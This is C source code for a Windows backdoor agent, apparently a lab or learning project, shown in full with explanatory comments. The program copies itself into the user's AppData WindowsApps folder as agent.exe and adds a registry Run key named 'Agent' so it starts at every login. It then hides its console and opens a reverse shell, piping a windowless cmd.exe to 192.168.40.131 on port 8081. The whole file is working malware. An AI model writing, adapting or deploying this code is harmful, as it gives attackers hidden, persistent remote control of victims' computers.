#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

void rev_shell();
void persistance();

int main() {
    //Get home path
    const char* username = getenv("USERPROFILE");
    char filename[MAX_PATH];
    char newLocation[MAX_PATH];
    //Setting Path of new location with user home path
    snprintf(newLocation, sizeof(newLocation), "%s\\AppData\\Local\\Microsoft\\WindowsApps\\agent.exe", username);
    BOOL stats = 0;
    //Get file name
    DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
    CopyFile(filename, newLocation, stats);
    //If copied file already exist, go to persistance
    if (strcmp(filename, newLocation) == 0) {
        persistance(newLocation);
    } else {
        //Copy agent to new location
        if (CopyFile(filename, newLocation, stats)) {
            persistance(newLocation);
        }else{
            printf("Error copying the file. Error code: %d\n", GetLastError());
        }
    }
}

void persistance(const char* newPath) {
    //Required Size for Wide Characters
    int size = MultiByteToWideChar(CP_UTF8, 0, newPath, -1, NULL, 0);
    //Allocate memory to store converted str
    wchar_t* proPath = (wchar_t*)malloc(size * sizeof(wchar_t));
    //Convert Path from char* to wchar_t* (narrow > wide char string)
    //Match the wide character format (L"string") used in the registry functions.  
    MultiByteToWideChar(CP_UTF8, 0, newPath, -1, proPath, size);
    HKEY hkey = NULL;
    //Create new key in windows start up
    LONG createStatus = RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    //Set value of key - Name is Agent, Value is String and Size is calculated
    //wcslen for len of string * size of wchar_t for data size
    LONG status = RegSetValueExW(hkey, L"Agent", 0, REG_SZ, (const BYTE *)proPath, (wcslen(proPath) + 1) * sizeof(wchar_t));
    if (status == 0) {
        rev_shell();
    }else{
        wprintf(L"RegCreateKeyW failed with error code: %ld\n", createStatus);
    }
}

void rev_shell() {
    //Hides cmd
    FreeConsole();
    SOCKET shell;
    WSADATA ver;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    struct sockaddr_in shell_addr;
    char ip_addr[] = "192.168.40.131";
    char RecData[512];
    int port = 8081;
    int connection;

    //Initializing WinSock Version 2
    WSAStartup(MAKEWORD(2,2), &ver);
    //Create TCP Socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); 

    //Shell Configuration
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    //Connecting to Target Server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR){
        printf("[i] Connection Failed");
        closesocket(shell);
        WSACleanup();
    }
    else{
        //Recv Socket, Where to Store Data, Max Size to Receive, 0
        recv(shell, RecData, sizeof(RecData), 0);
        //Set Value of Startup Infra Buffer to 0 (& means address)
        memset(&sinfo, 0, sizeof(sinfo));
        //Size of Structure
        sinfo.cb = sizeof(sinfo);
        //Determines whether startup info users are used when process creates a window
        //STARTF_USESTDHANDLES - Used for Standard Input, Output and Error
        //STARTF_USESHOWWINDOW - Contains Additional Information 
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        //Pipe Standard Input, Output and Error to Socket
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) shell;
        //Using CreateProcess API to spawn cmd
        //NULL, Process to Spawn, NULL, NULL, BOOLEAN, DWORD INT, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
        //Startup Process
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
        //Set Value of Receiving Server Buffer to 0
        memset(RecData, 0, sizeof(RecData));
    }
}

